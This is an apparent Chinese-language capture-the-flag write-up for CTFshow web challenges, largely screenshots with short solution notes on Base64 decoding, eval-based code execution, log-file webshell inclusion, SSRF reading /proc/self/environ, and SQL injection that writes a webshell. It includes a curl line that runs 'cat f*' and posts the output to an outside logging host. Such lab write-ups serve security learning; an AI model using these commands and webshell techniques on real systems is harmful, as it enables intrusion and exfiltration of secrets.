...
description: >-
  CTFshow web 应用安全与防护 wp（第一至第五章）：涵盖 Base64 编码隐藏与多层嵌套解码、HTTP 头注入、前端验证绕过等 Web 安全基础题的解题过程。
---
...
![](/images/ctfshow-web/1.png)

![](/images/ctfshow-web/2.png)
...
![3](/images/ctfshow-web/3.png)

![](/images/ctfshow-web/4.png)
...
![](/images/ctfshow-web/6.png)

导入密钥后可以看到http明文流量了

![](/images/ctfshow-web/7.png)



![](/images/ctfshow-web/8.png)
...
- 同时传入一个新的POST参数`1=phpinfo()`，这个参数会被`get_defined_vars()`捕获到，成为当前作用域内的一个变量。由于`array_pop(next(get_defined_vars()))`会获取到这个新定义的变量的值，也就是`phpinfo()`函数调用的结果，并将其作为参数传递给`eval()`函数，从而实现了代码执行。
...
- `curl 219tzymz.eyes.sh -X POST -d "1=`cat f*;cat /f*`"`：使用curl命令向指定的weblog平台发送一个POST请求，数据部分包含了一个参数`1`，其值是通过反引号执行的命令结果。


![](/images/ctfshow-web/11.png)

![](/images/ctfshow-web/12.png)
...
- 2. file 指定了日志文件路径，读取日志文件内容，当前php文件包含了日志内容,并做为php代码来执行,所以会执行日志里的一句话木马.
- 3. 利用日志的webshell,查看flag把内容重定向到新文件里了，访问新文件 1.txt 拿到flag

![18](/images/ctfshow-web/18.png)
...
![](/images/ctfshow-web/19.png)

base64解码，发现可疑文件`db.php`，再用伪协议读取`db.php`

![20](/images/ctfshow-web/20.png)

base64解码`db.php`内容，拿到flag

![21](/images/ctfshow-web/21.png)
...
![22](/images/ctfshow-web/22.png)

![](/images/ctfshow-web/23.png)
...
点击爬取百度，直接加载了一个百度首页，看到url参数比较可疑

![](/images/ctfshow-web/26.png)
...
![27](/images/ctfshow-web/27.png)

补充下linux基础知识

/proc 是 Linux 内核提供的虚拟文件系统，用于在运行时向用户空间暴露内核和进程信息，其中的 /proc/<PID>/cmdline 记录进程启动时的完整命令行参数，/proc/<PID>/environ 保存进程启动时的环境变量快照，二者都是内核实时生成的只读数据，广泛用于进程排查、安全审计和系统调试。

所以这里可以读取当前进程信息，如进程环境变量、进程启动命令

可以在环境变量里发现 flag 和当前目录 /app

![](/images/ctfshow-web/45.png)

题目名为 Flask_Session伪造 ，走作者预期思路去解题。通过进程启动命令检查是否存在路径及文件名，判断下面能否读取源码

通过读取 /proc/self/cmdline ，获取到当前进程的启动命令 python3 /app/app.py，使用绝对路径启动web服务

![](/images/ctfshow-web/46.png)

命令行快速查看进程信息：

```bash
# curl （ -k 选项用于忽略SSL证书验证，--output - 把响应内容显示在终端）
url=https://46fa8280-3c98-4653-9c62-c47f2b71364a.challenge.ctf.show
# 进程环境变量
curl -k "$url/read?url=file:///proc/self/environ" --output -
# 进程启动命令
curl -k "$url/read?url=file:///proc/self/cmdline" --output -
```

![](/images/ctfshow-web/47.png)

另外，`flask`工作目录比较常见的也是`/app/app.py`，尝试读取源码

![28](/images/ctfshow-web/28.png)
...
![31](/images/ctfshow-web/31.png)

![32](/images/ctfshow-web/32.png)
...
![](/images/ctfshow-web/35.png)

### 布尔盲注爆破

username,password都存在sql注入

![](/images/ctfshow-web/36.png)

尝试联合查询写入webshell

![](/images/ctfshow-web/37.png)

虽然页面报错了，但是成功写入到文件里了

![](/images/ctfshow-web/38.png)
...
![39](/images/ctfshow-web/39.png)

蚁剑连接数据库，查看flag

![40](/images/ctfshow-web/40.png)
